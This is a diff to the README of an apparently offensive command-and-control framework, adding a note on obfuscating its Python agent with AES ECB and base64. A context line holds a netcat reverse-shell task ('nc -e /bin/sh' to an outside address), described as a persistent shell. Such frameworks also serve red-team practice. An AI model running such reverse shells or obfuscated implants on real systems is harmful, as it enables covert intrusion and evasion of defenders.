@@ -10,7 +10,9 @@ Commander is a command and control framework (C2) written in Python, Flask and S
 
 ### Agents
 - Python 3
-  - Additionaly to the C agent the python agent supports also sessions, an interactive shell between the admin and the agent
+  - Additionaly to the C agent the python agent supports also:
+    - sessions, an interactive shell between the admin and the agent
+    - obfuscation
 - C
 
 ### Requirements
@@ -189,6 +191,17 @@ task add 85913eb1245d40eb96cf53eaf0b1e241 c2-shell nc -e /bin/sh 192.168.1.3 444
 
 ```
 This way you will have a 'die hard' shell that even if you get disconnected it will get back up immediately. Only the interactive commands will make it die permanently.
+
+## Obfuscation
+The python Agent offers obfuscation using a basic AES ECB encryption and base64 encoding
+Edit the obfuscator.py file and change the 'key' value to a 16 char lenght key in order to create a custom payload. The output of the new agent can be found in Agents/obs_agent.py
+You can run it like this:
+```
+python3 obfuscator.py
+
+# and to run the agent, do as usual
+python3 obs_agent.py
+```
 
 ## Testing
 pytest was used for the testing. You can run the tests like this:
